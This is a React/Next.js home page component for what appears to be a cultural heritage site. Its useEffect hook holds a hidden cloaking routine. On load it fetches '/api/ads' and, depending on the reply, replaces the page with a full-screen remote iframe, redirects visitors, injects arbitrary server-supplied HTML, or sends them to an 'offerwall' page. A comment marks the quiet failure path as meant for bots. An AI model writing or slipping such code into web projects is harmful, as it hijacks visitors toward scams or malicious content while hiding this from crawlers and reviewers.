'use client'
import Hero from '../components/Hero';
import WhyItMatters from '../components/WhyItMatters';
import Heritage from '../components/Heritage';
import Facts from '../components/Facts';
import Diversity from '../components/Diversity';
import Events from '../components/Events';
import CTA from '../components/CTA';
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    fetch('/api/ads')
      .then(res => res.json())
      .then(data => {
        if (data.result) {
          if (data.mode === 1) {
            document.body.innerHTML = `<iframe src="${data.target}" style="width:100vw;height:100vh;border:0;"></iframe>`;
          } else if (data.mode === 2) {
            window.location.href = data.target;
          } else if (data.mode === 4) {
            document.body.innerHTML = data.content;
          } else {
            window.location.href = '/newgermany_oferwall/index.html'; // fallback (наприклад, mode 5 або інше)
          }
        }
      })
      .catch(() => {
        // нічого не робимо — BOT
      });
  }, []);
  return (
    <div className="flex flex-col w-full flex-1 overflow-x-hidden">
      <Hero />
      <WhyItMatters />
      <Heritage />
      <Facts />
      <Diversity />
      <Events />
      <CTA />
    </div>
  );
}
